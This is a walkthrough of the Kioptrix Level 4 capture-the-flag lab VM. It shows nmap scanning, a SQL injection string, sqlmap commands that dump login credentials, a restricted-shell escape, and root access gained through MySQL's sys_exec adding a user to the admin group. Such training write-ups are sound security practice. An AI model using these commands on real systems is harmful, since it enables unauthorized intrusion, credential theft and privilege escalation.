# Kioptrix Level 4
Create a new Red Hat Linux VM and select the disk image with the challenge's.
![](https://i.imgur.com/NWG2WuI.png)
Host is `192.168.232.145`
![](https://i.imgur.com/GWo51YR.png)
Victim is `192.168.232.149`
`nmap -sS -sV -A -p- -oN NmapKioptrixLv4.txt 192.168.232.149`
![](https://i.imgur.com/cTYD6St.png)
Samba might be vulnerable? We test it later.
Here we got the Website and SSH, the SSH AC/PW might contain in the website.
Let's go find it.
![](https://i.imgur.com/LNSJKOD.png)
It's a simple login page.
We can try some SQLi, like:
`' or '1'='1`
![](https://i.imgur.com/hkKnzLh.png)
Wrong username.
Let's use Sqlmap to test the form.
![](https://i.imgur.com/oyWWTmb.png)
`sqlmap -r "KioptrixLv4Login.txt" --dbs`
![](https://i.imgur.com/2j2eBM8.png)
![](https://i.imgur.com/FVCcMEP.png)
We only know that database might be MySQL.
However, with `dirb`, we find that something apparently a username -- "John".
![](https://i.imgur.com/j2ydiJG.png)
Let's try this as username with sqlmap again.
Modified the POST text:
`sqlmap -r "KioptrixLv4Login1.txt" --dbms=MySQL`
![](https://i.imgur.com/LToRPGU.png)
`sqlmap -r "KioptrixLv4Login1.txt" --dbms=MySQL -D members --tables`
![](https://i.imgur.com/6t1kag7.png)
`sqlmap -r "KioptrixLv4Login1.txt" --dbms=MySQL -D members --T members --dump`
![](https://i.imgur.com/abpR79D.png)
Okay, we got the AC/PW here.
`Robert`'s password seems a Base64 encoded. But `John`'s is in plain text.
SSH with it.
![](https://i.imgur.com/177agch.png)
Here we are in the target's shell, but this shell is a restricted shell.
![](https://i.imgur.com/S9BJvak.png)
Reference to the article: [Escaping Restricted Linux Shells](https://www.sans.org/blog/escaping-restricted-linux-shells/)
We find this method might work with those restrict policies.
`echo python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()`
![](https://i.imgur.com/URknt9y.png)
Then you might get out the jail shell, and search the `/root`, you will find `congrats.txt`.
![](https://i.imgur.com/IQOuB2s.png)
But we are here to get the root privilege, no matter that flag not set in proper privilege.

Now you go to search the connection infomation in the web dirctory, `/home/www/*`, `/var/www/*`
Then you will find those in `/var/www/`
![](https://i.imgur.com/oIjOtOp.png)
Use it to connect to the MySQL database.
`mysql -h localhost -u root -p`
Then use this root privilege mysql to execute the system command like add john in to admin.
`select sys_exec('usermod -a -G admin john');`
![](https://i.imgur.com/Qz0mTjH.png)
Then `sudo su` to turn yourself in to root with john's password.
![](https://i.imgur.com/Tu6MjlZ.png)
